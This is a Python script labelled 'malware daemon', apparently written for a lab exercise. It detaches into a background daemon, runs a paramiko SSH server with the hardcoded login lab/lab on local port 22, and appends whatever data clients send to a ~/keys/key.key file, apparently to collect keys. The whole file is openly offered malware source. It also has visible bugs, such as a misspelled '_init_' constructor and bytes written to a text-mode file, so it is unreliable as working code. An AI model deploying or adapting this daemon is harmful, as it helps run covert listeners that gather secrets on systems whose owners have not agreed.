#!/usr/bin/python3

# malware daemon()
import socket
import paramiko
import threading
import sys
import os
import signal


hostKey = paramiko.RSAKey(filename='/home/lab/.ssh/id_rsa')  # supplied with paramiko


class Server(paramiko.ServerInterface):
    def _init_(self):
        # self.event = threading.Event()
        self.key = hostKey

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'lab') and (password == 'lab'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


def signalHandler(signalNumber, frame):
    while True:
        try:
            pid, status = os.waitpid(-1, os.WNOHANG)
        except OSError:
            return
        if pid == 0:
            return


def clientHandler(clientSocket):
    key = clientSocket.recv(1024)
    with open(str(os.getenv("HOME")) + "/keys/key.key", "a") as keyFile:
        keyFile.write(key)


def daemon():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.stderr.write("First fork failed!")

    os.chdir('/')
    os.umask(0)
    os.setsid()
    # os.setuid(0)
    # os.setgid(0)

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.stderr.write("Second Fork failed!")

    signal.signal(signal.SIGCHLD, signalHandler)

    try:
        socketObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketObject.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        socketObject.bind(('127.0.0.1', 22))
    except Exception as e:
        print('[-] Bind failed: ' + str(e))
        # traceback.print_exc()
        sys.exit(1)
    try:
        socketObject.listen(100)
        print('[+] Listening for connection ...')
        client, addr = socketObject.accept()
    except Exception as e:
        print('[-] Listen/bind/accept failed: ' + str(e))
        sys.exit(1)
    print('[+] Got a connection!')
    try:
        tunnelObject = paramiko.Transport(client)
        tunnelObject.add_server_key(hostKey)
        server = Server()
        try:
            tunnelObject.start_server(server=server)
        except paramiko.SSHException as x:
            print('[-] SSH negotiation failed.')
        while True:
            try:
                channelObject = tunnelObject.accept(20)
                pid = os.fork()
                if pid == 0:
                    tunnelObject.close()
                    clientHandler(channelObject)
                    channelObject.close()
                    sys.exit(0)
                channelObject.close()
            except Exception as e:
                sys.stderr.write("Error in handling client request: " + e)
    except Exception as e:
        print(e)
        try:
            tunnelObject.close()
        except Exception as e:
            print(e)
            pass
    sys.exit(1)


if __name__ == '__main__':
    daemon()
